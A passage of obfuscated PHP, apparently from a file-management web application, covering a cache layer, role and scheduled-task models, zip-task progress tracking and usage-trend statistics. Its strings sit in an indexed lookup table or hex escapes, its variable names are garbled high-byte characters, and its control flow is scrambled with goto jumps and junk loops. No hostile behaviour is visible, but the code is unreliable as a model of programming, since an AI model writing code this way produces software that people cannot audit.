$_SERVER[ÒÆ›ÆØÎ¾][788]; $AÃ§Ã‰è¦ = $dŠ‚ÔíØ¼µ($F²ò†ÃôÑÆ); goto eçàÅ‚ÛÈ´; Cá›†É²°: $Béñ‘–Ñà($_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][787]] . $_SERVER[ÒÆ›ÆØÎ¾][788]); $dåÃÛõæÕ» = 2; while ($dåÃÛõæÕ» > 1) { $eñá¥âä = rawurlencode($dåÃÛõæÕ» . $_SERVER[ÒÆ›ÆØÎ¾][375]); } goto EîœêÍ“õÀ; EîœêÍ“õÀ: } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto aÄ¤‡Ğ¢´´; aÄ¤‡Ğ¢´´: $fîÁİäÊ‚Ó =& $_SERVER[ÒÆ›ÆØÎ¾]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fäÈÇã·ŠÍ; fäÈÇã·ŠÍ: $BŒ¦Ê“ÏÑœ = $GLOBALS[$fîÁİäÊ‚Ó[6]][$fîÁİäÊ‚Ó[347]]; $fÑÙ—äÈŞÛ = $BŒ¦Ê“ÏÑœ[$BŒ¦Ê“ÏÑœ[$fîÁİäÊ‚Ó[791]]]; $bèâòÕÆ„Š = $BŒ¦Ê“ÏÑœ[$fîÁİäÊ‚Ó[792]]; goto bêàÀŠÍ¶Ñ; bêàÀŠÍ¶Ñ: switch ($BŒ¦Ê“ÏÑœ[$fîÁİäÊ‚Ó[791]]) { case $fîÁİäÊ‚Ó[17]: self::$handle = Model($fîÁİäÊ‚Ó[793]); break; case $fîÁİäÊ‚Ó[794]: self::$handle = new CacheRedis($fÑÙ—äÈŞÛ, $bèâòÕÆ„Š); break; case $fîÁİäÊ‚Ó[795]: self::$handle = new CacheMemcached($fÑÙ—äÈŞÛ, $bèâòÕÆ„Š); break; case $fîÁİäÊ‚Ó[193]: self::$handle = new CacheFile($fÑÙ—äÈŞÛ, $bèâòÕÆ„Š); break; default: break; } return self::$handle; goto Eµî«ƒ†®œ; Eµî«ƒ†®œ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($D‚Ò’Ë¶Ê·) { if (is_array($D‚Ò’Ë¶Ê·) || is_object($D‚Ò’Ë¶Ê·)) { $D‚Ò’Ë¶Ê· = json_encode($D‚Ò’Ë¶Ê·); } $D‚Ò’Ë¶Ê· = rawurlencode($D‚Ò’Ë¶Ê·); return md5(KOD_SITE_ID . $_SERVER[ÒÆ›ÆØÎ¾][71] . $D‚Ò’Ë¶Ê·); } public static function get($C›…§«§, $eõ•»¯‡‡é = false) { $fô·©Âˆœ´ = self::key($C›…§«§); if ($eõ•»¯‡‡é) { return unserialize(self::init()->get($fô·©Âˆœ´)); } if (!isset(self::$memoryCache[$fô·©Âˆœ´])) { $EĞ†¸Ãİµ = self::init()->get($fô·©Âˆœ´); self::$memoryCache[$fô·©Âˆœ´] = unserialize($EĞ†¸Ãİµ); } return self::$memoryCache[$fô·©Âˆœ´]; } public static function set($cèÕã´­™Ğ, $a«¿¡ÕÀĞ…, $f¡™ÏÖ•Î = false) { goto d‹°²·Ûâ; E‚íøë¦‘›: CacheLock::lock($cèÕã´­™Ğ); $d£ù±ÂˆÜ¡ = self::init()->set($dğ–ˆÍõ¥‚, serialize($a«¿¡ÕÀĞ…), $f¡™ÏÖ•Î); self::$memoryCache[$dğ–ˆÍõ¥‚] = $a«¿¡ÕÀĞ…; goto a´İùµ¿Š‡; a´İùµ¿Š‡: CacheLock::unlock($cèÕã´­™Ğ); return $d£ù±ÂˆÜ¡; goto fŒ£Ïî÷’‹; d‹°²·Ûâ: $dğ–ˆÍõ¥‚ = self::key($cèÕã´­™Ğ); if (isset(self::$memoryCache[$dğ–ˆÍõ¥‚]) && self::$memoryCache[$dğ–ˆÍõ¥‚] === $a«¿¡ÕÀĞ…) { return !0; } if ($f¡™ÏÖ•Î === 0) { self::$memoryCache[$dğ–ˆÍõ¥‚] = $a«¿¡ÕÀĞ…; return !0; } goto E‚íøë¦‘›; fŒ£Ïî÷’‹: } public static function getCall($A–ôÚğ«•¹, $AÄŸøƒÜï, $cğ’®°ÆîĞ, $aêº¢­ªËğ = array()) { goto aĞ‡§†İ; B™‡å±†Ï: return $Bã¤ïùŸªª; goto cš§«³¬öÉ; aĞ‡§†İ: $d±±âóã÷  =& $_SERVER[ÒÆ›ÆØÎ¾]; $Bã¤ïùŸªª = self::get($A–ôÚğ«•¹); if ($Bã¤ïùŸªª || $Bã¤ïùŸªª === $d±±âóã÷ [33]) { return $Bã¤ïùŸªª; } goto Aá¯õºÚ‘æ; Aá¯õºÚ‘æ: $Bã¤ïùŸªª = call_user_func_array($cğ’®°ÆîĞ, $aêº¢­ªËğ); $Bã¤ïùŸªª = $Bã¤ïùŸªª ? $Bã¤ïùŸªª : $d±±âóã÷ [33]; self::set($A–ôÚğ«•¹, $Bã¤ïùŸªª, $AÄŸøƒÜï); goto B™‡å±†Ï; cš§«³¬öÉ: } public static function remove($aË”ÉÚæäÒ) { goto Eƒ¾ŒÚšºõ; fÃËÚ½Öœ×: return $e‰¤”öèì“; goto DÚøÊ‹Ğó¢; Eƒ¾ŒÚšºõ: $aÇ•Í¦Œœ™ = self::key($aË”ÉÚæäÒ); unset(self::$memoryCache[$aÇ•Í¦Œœ™]); self::clearTimeout(); goto dÚé»š°°¢; dÚé»š°°¢: CacheLock::lock($aË”ÉÚæäÒ); $e‰¤”öèì“ = self::init()->remove($aÇ•Í¦Œœ™); CacheLock::unlock($aË”ÉÚæäÒ); goto fÃËÚ½Öœ×; DÚøÊ‹Ğó¢: } public static function removeMemory($b“†ø›¸Œ—) { $c²‹‚Àñ´ = self::key($b“†ø›¸Œ—); unset(self::$memoryCache[$c²‹‚Àñ´]); } public static function clearMemory($BÅ¾Û¤†î = false) { if ($BÅ¾Û¤†î) { $BÅ¾Û¤†î = self::key($BÅ¾Û¤†î); unset(self::$memoryCache[$BÅ¾Û¤†î]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÒÆ›ÆØÎ¾][796])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÒÆ›ÆØÎ¾][797])) { self::init()->clearTimeout(); } } } goto a£ğ°Æ¼ôÂ; A÷„¾°İï×: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x72\157\x6c\x65\114\151\163\164"; public $field = array("\156\141\155\145", "\141\x75\164\150", "\154\x61\x62\145\x6c", "\x64\151\163\160\x6c\141\x79", "\x73\171\x73\164\x65\155", "\144\145\x73\x63", "\151\147\x6e\x6f\162\145\x45\170\164", "\x69\x67\x6e\x6f\162\145\x46\151\x6c\145\x53\x69\172\x65", "\141\x64\155\x69\x6e\x69\163\164\162\141\164\157\x72", "\x73\x6f\x72\164"); public function listData($D¨™Ñ‘ÆÇ = false, $e¡Œ¸¬ÒÁÉ = "\163\157\162\x74", $c¨µÔÔÍØ = false) { $AâßËöçËù =& $_SERVER[ÒÆ›ÆØÎ¾]; $C‡Ø‚¡ÅÉ‡ = parent::listData($D¨™Ñ‘ÆÇ, $e¡Œ¸¬ÒÁÉ, $c¨µÔÔÍØ); if (!$D¨™Ñ‘ÆÇ) { foreach ($C‡Ø‚¡ÅÉ‡ as $EĞ‡‚ÎŒá => $fŒÊ‰Û‰çÚ) { if ($fŒÊ‰Û‰çÚ[$AâßËöçËù[1870]] == 1) { $C‡Ø‚¡ÅÉ‡[$EĞ‡‚ÎŒá][$AâßËöçËù[431]] = LNG($AâßËöçËù[2096]); } } } return $C‡Ø‚¡ÅÉ‡; } public function update($B¦ˆÊò¿, $b÷«…ÉäÜâ) { goto B½°Í˜ÄÖ¤; bÚÀêß›È: return parent::update($B¦ˆÊò¿, $b÷«…ÉäÜâ); goto c’‹Ö¤Ë·Š; F×Ê¯°¾‹: if (!$aÖ ›…Êá– || $A” ‚é¤ && $A” ‚é¤[$fÇËóÓºã[393]] != $aÖ ›…Êá–[$fÇËóÓºã[393]]) { return !1; } if ($A” ‚é¤[$fÇËóÓºã[1870]] == 1) { $b÷«…ÉäÜâ = array($fÇËóÓºã[28] => $b÷«…ÉäÜâ[$fÇËóÓºã[28]], $fÇËóÓºã[1702] => $b÷«…ÉäÜâ[$fÇËóÓºã[1702]]); } $this->filterAuth($b÷«…ÉäÜâ[$fÇËóÓºã[406]]); goto bÚÀêß›È; B½°Í˜ÄÖ¤: $fÇËóÓºã =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÖ ›…Êá– = parent::listData($B¦ˆÊò¿); $A” ‚é¤ = $this->findByName($b÷«…ÉäÜâ[$fÇËóÓºã[28]]); goto F×Ê¯°¾‹; c’‹Ö¤Ë·Š: } public function remove($eÆİì–©ó) { $FèàÏ÷É‹ = parent::listData($eÆİì–©ó); if (!$FèàÏ÷É‹ || $FèàÏ÷É‹[$_SERVER[ÒÆ›ÆØÎ¾][1162]]) { return !1; } return parent::remove($eÆİì–©ó); } public function add($cµ…»À³Öæ) { goto DÁĞ¬ÎÇòÏ; DÁĞ¬ÎÇòÏ: $aã‡Üòæ˜Ø =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÅÕ§åğÏ¶ = $cµ…»À³Öæ[$aã‡Üòæ˜Ø[28]]; if ($this->findByName($BÅÕ§åğÏ¶)) { return !1; } goto eßí‡ª”ãÖ; eßí‡ª”ãÖ: $EÖ—Ù‹ß“æ = array($aã‡Üòæ˜Ø[413] => $BÅÕ§åğÏ¶, $aã‡Üòæ˜Ø[1687] => $aã‡Üòæ˜Ø[33], $aã‡Üòæ˜Ø[1683] => $aã‡Üòæ˜Ø[1691], $aã‡Üòæ˜Ø[2097] => 1, $aã‡Üòæ˜Ø[1686] => 0, $aã‡Üòæ˜Ø[2098] => 0, $aã‡Üòæ˜Ø[1685] => $this->getSort()); $cµ…»À³Öæ = array_merge($EÖ—Ù‹ß“æ, $cµ…»À³Öæ); $this->filterAuth($cµ…»À³Öæ[$aã‡Üòæ˜Ø[406]]); goto E£¨´ ˆá§; E£¨´ ˆá§: return parent::insert($cµ…»À³Öæ); goto EÛÚËŸÉĞ¨; EÛÚËŸÉĞ¨: } private function getSort() { $f«š¦¿• =& $_SERVER[ÒÆ›ÆØÎ¾]; $dæÅÇ¬¯£­ = parent::listData(); $Eè•Ú—¾ÌÜ = array_to_keyvalue($dæÅÇ¬¯£­, $f«š¦¿•[33], $f«š¦¿•[1704]); return empty($Eè•Ú—¾ÌÜ) ? 0 : max($Eè•Ú—¾ÌÜ) + 1; } private function filterAuth(&$Cöï‡°Éêî) { $dŠ‚åƒƒ÷Ç =& $_SERVER[ÒÆ›ÆØÎ¾]; $fˆ Ÿø®¿† = array(); $B¸œĞêé‹à = array_filter(explode($dŠ‚åƒƒ÷Ç[47], $Cöï‡°Éêî)); foreach ($B¸œĞêé‹à as $Cöï‡°Éêî) { $fóöÌÇ‡Ï¶ = explode($dŠ‚åƒƒ÷Ç[95], $Cöï‡°Éêî); if ($fóöÌÇ‡Ï¶[0] == $dŠ‚åƒƒ÷Ç[2099] && $fóöÌÇ‡Ï¶[1] != $dŠ‚åƒƒ÷Ç[1081]) { $B¸Âñàİ»Ó = $fóöÌÇ‡Ï¶[0] . $dŠ‚åƒƒ÷Ç[95] . $fóöÌÇ‡Ï¶[1] . $dŠ‚åƒƒ÷Ç[2100]; if (!in_array($B¸Âñàİ»Ó, $B¸œĞêé‹à)) { $fˆ Ÿø®¿†[] = $B¸Âñàİ»Ó; } } $fˆ Ÿø®¿†[] = $Cöï‡°Éêî; } $Cöï‡°Éêî = implode($dŠ‚åƒƒ÷Ç[47], $fˆ Ÿø®¿†); } public function sort($C×Õ‡¸ŒÂê, $aÛ¹Å…„ö) { return parent::update($C×Õ‡¸ŒÂê, $aÛ¹Å…„ö); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\164\141\163\x6b\x4c\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\164\171\160\145", "\x65\166\145\x6e\x74", "\x74\x69\155\x65", "\x64\x65\163\143", "\163\171\x73\164\x65\155", "\x65\x6e\141\x62\x6c\x65", "\154\141\x73\x74\122\x75\x6e", "\x73\157\x72\x74"); public function listData($d»Íìïù§ = false, $B‘”ÚÙ‹…ã = "\163\157\162\x74", $c¬ÑÒĞ•ò = false) { return parent::listData($d»Íìïù§, $B‘”ÚÙ‹…ã, $c¬ÑÒĞ•ò); } public function add($c–ÏêÏï—“) { $C†®†ê®ª =& $_SERVER[ÒÆ›ÆØÎ¾]; $e¨éàËæù = $this->findByName($c–ÏêÏï—“[$C†®†ê®ª[28]]); if ($e¨éàËæù) { return !1; } $c–ÏêÏï—“[$C†®†ê®ª[1482]] = 0; $c–ÏêÏï—“[$C†®†ê®ª[1704]] = $this->getSort(); return parent::insert($c–ÏêÏï—“); } private function getSort() { $báê…¡›«Ô =& $_SERVER[ÒÆ›ÆØÎ¾]; $C§›é†ÚáÏ = parent::listData(); $cĞ³Õ¬•¡ = array_to_keyvalue($C§›é†ÚáÏ, $báê…¡›«Ô[33], $báê…¡›«Ô[1704]); return empty($cĞ³Õ¬•¡) ? 0 : max($cĞ³Õ¬•¡) + 1; } public function update($aöÇ±ëÃ’, $AÜåëÍ•Û¼) { $eƒ¢†‘ì› =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÃ×ÙÎ¡¥à = $this->listData($aöÇ±ëÃ’); $d”ÛÛ‹ Ûì = $this->findByName($AÜåëÍ•Û¼[$eƒ¢†‘ì›[28]]); if (!$FÃ×ÙÎ¡¥à || $d”ÛÛ‹ Ûì && $d”ÛÛ‹ Ûì[$eƒ¢†‘ì›[393]] != $FÃ×ÙÎ¡¥à[$eƒ¢†‘ì›[393]]) { return !1; } return parent::update($aöÇ±ëÃ’, $AÜåëÍ•Û¼); } public function remove($CØìŒ•¬äã, $EÈÂÛåŸÓø = false) { $b—ãÇ¿ô•© =& $_SERVER[ÒÆ›ÆØÎ¾]; $CéÜ¤½ƒŒ = $this->listData($CØìŒ•¬äã); if (!$CéÜ¤½ƒŒ) { return; } if (!$EÈÂÛåŸÓø && $CéÜ¤½ƒŒ[$b—ãÇ¿ô•©[1162]] == $b—ãÇ¿ô•©[87]) { return !1; } return parent::remove($CØìŒ•¬äã); } public function enable($EÛ±”«¤Öø, $C†Ï¾’†ˆ) { return $this->update($EÛ±”«¤Öø, array($_SERVER[ÒÆ›ÆØÎ¾][2091] => $C†Ï¾’†ˆ)); } public function run($c‡÷æéÊÎ÷) { return $this->update($c‡÷æéÊÎ÷, array($_SERVER[ÒÆ›ÆØÎ¾][2101] => time())); } } goto aä¿¦†œ¢Â; AéªôÍáÜ: class TaskZip extends TaskFileTransfer { protected function startAfter() { $A£…¤…Ç =& $_SERVER[ÒÆ›ÆØÎ¾]; parent::startAfter(); Hook::bind($A£…¤…Ç[1605], array($this, $A£…¤…Ç[1600])); $aµæ³ÃİÑ =& $this->task; $aµæ³ÃİÑ[$A£…¤…Ç[1602]] = $A£…¤…Ç[1085]; if (!$aµæ³ÃİÑ[$A£…¤…Ç[1423]]) { $aµæ³ÃİÑ[$A£…¤…Ç[1423]] = LNG($A£…¤…Ç[1606]); } } protected function endAfter() { $Eæêõ‰É™ì =& $_SERVER[ÒÆ›ÆØÎ¾]; parent::endAfter(); Hook::unbind($Eæêõ‰É™ì[1605], array($this, $Eæêõ‰É™ì[1600])); } public function updateAfter() { $eˆ‡²±…ÇÎ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fè‰ô±µ± =& $this->task; if (!$fè‰ô±µ±[$eˆ‡²±…ÇÎ[1012]] || !$fè‰ô±µ±[$eˆ‡²±…ÇÎ[715]]) { return; } if ($fè‰ô±µ±[$eˆ‡²±…ÇÎ[1602]] == $eˆ‡²±…ÇÎ[1085]) { $B”ÎŞšç¤÷ = $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1562]]; if ($fè‰ô±µ±[$eˆ‡²±…ÇÎ[1563]] != $eˆ‡²±…ÇÎ[1085]) { $B”ÎŞšç¤÷ = 0; } $C…­ƒ´‡‡À = ($fè‰ô±µ±[$eˆ‡²±…ÇÎ[1566]] + $B”ÎŞšç¤÷) / $fè‰ô±µ±[$eˆ‡²±…ÇÎ[715]]; $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1518]] = $C…­ƒ´‡‡À * 0.3; } else { if ($fè‰ô±µ±[$eˆ‡²±…ÇÎ[1602]] == $eˆ‡²±…ÇÎ[311]) { $C…­ƒ´‡‡À = $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1027]] / $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1012]]; $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1518]] = 0.3 + $C…­ƒ´‡‡À * 0.5; } else { if ($fè‰ô±µ±[$eˆ‡²±…ÇÎ[1602]] == $eˆ‡²±…ÇÎ[107]) { $C…­ƒ´‡‡À = 0; if ($fè‰ô±µ±[$eˆ‡²±…ÇÎ[1561]]) { $C…­ƒ´‡‡À = $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1562]] / $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1561]]; } $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1518]] = 0.3 + 0.5 + $C…­ƒ´‡‡À * 0.2; } } } if ($fè‰ô±µ±[$eˆ‡²±…ÇÎ[1518]] > 0) { $b¤¨İ÷§ä† = timeFloat() - $fè‰ô±µ±[$eˆ‡²±…ÇÎ[741]] - $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1521]]; $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1522]] = $b¤¨İ÷§ä† * (1 - $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1518]]) / $fè‰ô±µ±[$eˆ‡²±…ÇÎ[1518]]; } } public function copyFileStart($bô¾°ïÚ‡Ô, $fÕ‰Œ¿¨‘œ, $bàó©ÍŞİ, $dÉ¸à“¹ØŒ, $c§Ş¥òÉ‡·, $Aˆˆâ¡’§‰) { $Bœ¬ñë¢§ =& $_SERVER[ÒÆ›ÆØÎ¾]; parent::copyFileStart($bô¾°ïÚ‡Ô, $fÕ‰Œ¿¨‘œ, $bàó©ÍŞİ, $dÉ¸à“¹ØŒ, $c§Ş¥òÉ‡·, $Aˆˆâ¡’§‰); $eŞãòŞå© =& $this->task; if ($eŞãòŞå©[$Bœ¬ñë¢§[1602]] == $Bœ¬ñë¢§[311]) { $eŞãòŞå©[$Bœ¬ñë¢§[1602]] = $Bœ¬ñë¢§[107]; } $this->update(); } public function copyFileEnd($E¥¼Ñ…›íÕ, $e×—ÒŸ“–, $Dì¿¸åŠ—ë, $BÁ¹Ñèï£Ã, $f£öá‘ñ…‹, $bË÷®æ‹¼) { $bĞ¡ºÊØöñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DîÊîê¥à =& $this->task; $DîÊîê¥à[$bĞ¡ºÊØöñ[1562]] = $DîÊîê¥à[$bĞ¡ºÊØöñ[1561]]; $DîÊîê¥à[$bĞ¡ºÊØöñ[1566]] += $DîÊîê¥à[$bĞ¡ºÊØöñ[1561]]; $DîÊîê¥à[$bĞ¡ºÊØöñ[1563]] = $bĞ¡ºÊØöñ[33]; $this->update(); } public function nameParse($FÖ»¤¼ä) { $d½ÂÚèÚ”¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $f¶£—Š¦Ø§ =& $this->task; if ($f¶£—Š¦Ø§[$d½ÂÚèÚ”¶[1027]] < $f¶£—Š¦Ø§[$d½ÂÚèÚ”¶[1012]]) { $e§Òº‘Ãù = get_path_this($FÖ»¤¼ä); if (strstr($e§Òº‘Ãù, $d½ÂÚèÚ”¶[95])) { $f¶£—Š¦Ø§[$d½ÂÚèÚ”¶[1027]] += 1; } } if ($f¶£—Š¦Ø§[$d½ÂÚèÚ”¶[1602]] == $d½ÂÚèÚ”¶[1085]) { $f¶£—Š¦Ø§[$d½ÂÚèÚ”¶[1602]] = $d½ÂÚèÚ”¶[311]; } $f¶£—Š¦Ø§[$d½ÂÚèÚ”¶[1559]] = $FÖ»¤¼ä; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($f¾š¢š˜Ã ) { $BŠ¾ö§¥Á• =& $_SERVER[ÒÆ›ÆØÎ¾]; $A‘ì‹ˆ­õ = array($BŠ¾ö§¥Á•[562] => array($BŠ¾ö§¥Á•[29] => $BŠ¾ö§¥Á•[1607], $BŠ¾ö§¥Á•[271] => array($BŠ¾ö§¥Á•[222], $BŠ¾ö§¥Á•[717], $BŠ¾ö§¥Á•[1608], $BŠ¾ö§¥Á•[1609])), $BŠ¾ö§¥Á•[1610] => array($BŠ¾ö§¥Á•[29] => $BŠ¾ö§¥Á•[1611], $BŠ¾ö§¥Á•[271] => array($BŠ¾ö§¥Á•[222], $BŠ¾ö§¥Á•[715], $BŠ¾ö§¥Á•[1612], $BŠ¾ö§¥Á•[1613], $BŠ¾ö§¥Á•[1614]))); if (!isset($A‘ì‹ˆ­õ[$f¾š¢š˜Ã ])) { return !1; } $this->optionType = $A‘ì‹ˆ­õ[$f¾š¢š˜Ã ][$BŠ¾ö§¥Á•[29]]; $this->field = $A‘ì‹ˆ­õ[$f¾š¢š˜Ã ][$BŠ¾ö§¥Á•[271]]; return !0; } public function listData($B¦‚ÕìÍ°™ = false, $DáËè·½â = "\x6d\x6f\x64\151\x66\x79\x54\x69\x6d\145", $B¯ñ¼òµ = false) { return parent::listData($B¦‚ÕìÍ°™, $DáËè·½â, $B¯ñ¼òµ); } public function trendList($E‰Îáñˆ) { goto F›Ú¡ÅÖ«ƒ; F›Ú¡ÅÖ«ƒ: $eÀ­ˆÜ¿ÜÖ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c—êáñ¤àĞ = $this->listData(); if ($c—êáñ¤àĞ) { $aòÙ”Ø¦™Œ = end($c—êáñ¤àĞ); $a‚¡²‰‰â§ = date($eÀ­ˆÜ¿ÜÖ[1615], strtotime($eÀ­ˆÜ¿ÜÖ[1616])); if ($aòÙ”Ø¦™Œ[$eÀ­ˆÜ¿ÜÖ[222]] == $a‚¡²‰‰â§) { return $c—êáñ¤àĞ; } $f®¤æí¯”Ù = strtotime($aòÙ”Ø¦™Œ[$eÀ­ˆÜ¿ÜÖ[222]]); } goto D«Ÿä¸ë“; D«Ÿä¸ë“: if (!isset($f®¤æí¯”Ù)) { $aÈÅÚØÅÕÒ = $E‰Îáñˆ == $eÀ­ˆÜ¿ÜÖ[562] ? $eÀ­ˆÜ¿ÜÖ[506] : $eÀ­ˆÜ¿ÜÖ[782]; $f®¤æí¯”Ù = Model($aÈÅÚØÅÕÒ)->min($eÀ­ˆÜ¿ÜÖ[194]); } $bñßè™°Ô÷ = $eÀ­ˆÜ¿ÜÖ[1617] . ucfirst($E‰Îáñˆ); $CËÜš¬õŞê = $this->dateList($f®¤æí¯”Ù); goto a¼İ°‰º; a¼İ°‰º: foreach ($CËÜš¬õŞê as $a‚¡²‰‰â§) { $this->{$bñßè™°Ô÷}($a‚¡²‰‰â§); } return $this->listData(); goto Dæ¿ó³ó”Æ; Dæ¿ó³ó”Æ: } private function dateList($fÆãñÔÒë­) { $F°®õÌ‡¹ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D‘³¾Í»Û = $fÆãñÔÒë­; $FÍ¤£ˆçï› = strtotime($F°®õÌ‡¹[1616]); $AªŸ‹¨¨Õ = array(); while ($D‘³¾Í»Û <= $FÍ¤£ˆçï›) { $AªŸ‹¨¨Õ[] = date($F°®õÌ‡¹[1615], $D‘³¾Í»Û); $D‘³¾Í»Û = strtotime($F°®õÌ‡¹[1618], $D‘³¾Í»Û); } return $AªŸ‹¨¨Õ; } public function _recordUser($AÙŒ…©òí = '') { goto f“§ˆæùõò; d ªÓ×Á‡: $d‹ ¿œ¨ä = Model($Bä°¶à…Ô[506])->where($CôªßÔÕç¹)->count($Bä°¶à…Ô[1517]); $CôªßÔÕç¹[$Bä°¶à…Ô[29]] = $Bä°¶à…Ô[1621]; $f´ÔÉ•Š™Ğ = Model($Bä°¶à…Ô[1622])->where($CôªßÔÕç¹)->count($Bä°¶à…Ô[1623]); goto d„‚Çå½ç¾; d„‚Çå½ç¾: $eèÎä£ŸñŞ = array($Bä°¶à…Ô[222] => $AÙŒ…©òí, $Bä°¶à…Ô[717] => (int) $döÏ¿Ì—á¼, $Bä°¶à…Ô[1608] => (int) $d‹ ¿œ¨ä, $Bä°¶à…Ô[1609] => (int) $f´ÔÉ•Š™Ğ); return $this->insert($eèÎä£ŸñŞ); goto bå‡Ğ„ ê×; Dä¤÷…‰Õ: $CôªßÔÕç¹ = array($Bä°¶à…Ô[194] => array($Bä°¶à…Ô[961], $BˆÔÑ¦ô±ç)); $döÏ¿Ì—á¼ = Model($Bä°¶à…Ô[506])->where($CôªßÔÕç¹)->count($Bä°¶à…Ô[1517]); $CôªßÔÕç¹[$Bä°¶à…Ô[194]] = array($Bä°¶à…Ô[331], array($e¦½˜ÑÆËî, $BˆÔÑ¦ô±ç)); goto d ªÓ×Á‡; f“§ˆæùõò: $Bä°¶à…Ô =& $_SERVER[ÒÆ›ÆØÎ¾]; $e¦½˜ÑÆËî = strtotime(date($Bä°¶à…Ô[1619], strtotime($AÙŒ…©òí))); $BˆÔÑ¦ô±ç = strtotime(date($Bä°¶à…Ô[1620], strtotime($AÙŒ…©òí))); goto Dä¤÷…‰Õ; bå‡Ğ„ ê×: } public function _recordStore($fˆÕÌ†Åİ‡ = '') { goto dÖ×‡©ˆìé; E¬Œö¬‚Ê: $CÒ’ÙãÜõÆ[$Aì¨®†­‹œ[404]] = 1; $bí‰Ó“¬—µ = Model($Aì¨®†­‹œ[782])->where($CÒ’ÙãÜõÆ)->sum($Aì¨®†­‹œ[78]); $CÒ’ÙãÜõÆ[$Aì¨®†­‹œ[404]] = 2; goto f¨ˆ¤º¬Í; Fªè‡ÚÓÎ–: $Bç÷“”õí´ = Model($Aì¨®†­‹œ[450])->where($CÒ’ÙãÜõÆ)->sum($Aì¨®†­‹œ[78]); $CÒ’ÙãÜõÆ[$Aì¨®†­‹œ[403]] = 0; $e™ŒİÒŒá = Model($Aì¨®†­‹œ[782])->where($CÒ’ÙãÜõÆ)->sum($Aì¨®†­‹œ[78]); goto E¬Œö¬‚Ê; f¨ˆ¤º¬Í: $F×ºÓ­à•‘ = Model($Aì¨®†­‹œ[782])->where($CÒ’ÙãÜõÆ)->sum($Aì¨®†­‹œ[78]); $EËäØôøİ„ = array($Aì¨®†­‹œ[222] => $fˆÕÌ†Åİ‡, $Aì¨®†­‹œ[715] => (int) $e™ŒİÒŒá, $Aì¨®†­‹œ[1612] => (int) $Bç÷“”õí´, $Aì¨®†­‹œ[1613] => (int) $bí‰Ó“¬—µ, $Aì¨®†­‹œ[1614] => (int) $F×ºÓ­à•‘); return $this->insert($EËäØôøİ„); goto d¢„‘ËŞ°ø; dÖ×‡©ˆìé: $Aì¨®†­‹œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $dã¹¥Ö–±Š = strtotime(date($Aì¨®†­‹œ[1620], strtotime($fˆÕÌ†Åİ‡))); $CÒ’ÙãÜõÆ = array($Aì¨®†­‹œ[194] => array($Aì¨®†­‹œ[961], $dã¹¥Ö–±Š)); goto Fªè‡ÚÓÎ–; d¢„‘ËŞ°ø: } public function trend($eß‡È„Íœ, $Cò¾ñ²çğ¤) { goto a‚¯™ÄŸ÷è; eõ‚‚íÉÃ: if (empty($F™ëç‚‹Ş)) { $dñ‡Ë¸Éší = date($CòƒË²ÛŠº[1615], strtotime($CòƒË²ÛŠº[1616])); $DŞÄòØãÆ¨ = array($CòƒË²ÛŠº[222] => $dñ‡Ë¸Éší); foreach ($e—¿¬ÔİÇš[$eß‡È„Íœ] as $fœ›È¡Ì => $FâÈÒã¨‰‚) { $DŞÄòØãÆ¨[$fœ›È¡Ì] = 0; } $F™ëç‚‹Ş[] = $DŞÄòØãÆ¨; } $bÃ§Ò­·Öİ = array(); foreach ($F™ëç‚‹Ş as $FâÈÒã¨‰‚) { if ($eß‡È„Íœ == $CòƒË²ÛŠº[1610] && $FâÈÒã¨‰‚[$CòƒË²ÛŠº[1612]] > $FâÈÒã¨‰‚[$CòƒË²ÛŠº[715]]) { $FâÈÒã¨‰‚[$CòƒË²ÛŠº[1612]] = $FâÈÒã¨‰‚[$CòƒË²ÛŠº[715]]; } foreach ($e—¿¬ÔİÇš[$eß‡È„Íœ] as $fœ›È¡Ì => $bæÊÂõ«ğì) { $fÂòï¡£ƒĞ = array($CòƒË²ÛŠº[222] => $FâÈÒã¨‰‚[$CòƒË²ÛŠº[222]], $CòƒË²ÛŠº[1423] => $bæÊÂõ«ğì); $fÂòï¡£ƒĞ[$BÑëÕñ¡“É[$eß‡È„Íœ]] = isset($FâÈÒã¨‰‚[$fœ›È¡Ì]) ? $FâÈÒã¨‰‚[$fœ›È¡Ì] : 0; $bÃ§Ò­·Öİ[] = $fÂòï¡£ƒĞ; } } goto D›ïøñ©†Ñ; D›ïøñ©†Ñ: return $bÃ§Ò­·Öİ; goto eïÈ„¯ĞîŸ; a‚¯™ÄŸ÷è: $CòƒË²ÛŠº =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->init($eß‡È„Íœ)) { return !1; } $F™ëç‚‹Ş = $this->trendList($eß‡È„Íœ); goto bô‹òĞÊ²; bô‹òĞÊ²: if ($F™ëç‚‹Ş && $Cò¾ñ²çğ¤ != $CòƒË²ÛŠº[1491]) { $FË°øŞÁ®š = $F™ëç‚‹Ş[0][$CòƒË²ÛŠº[222]]; 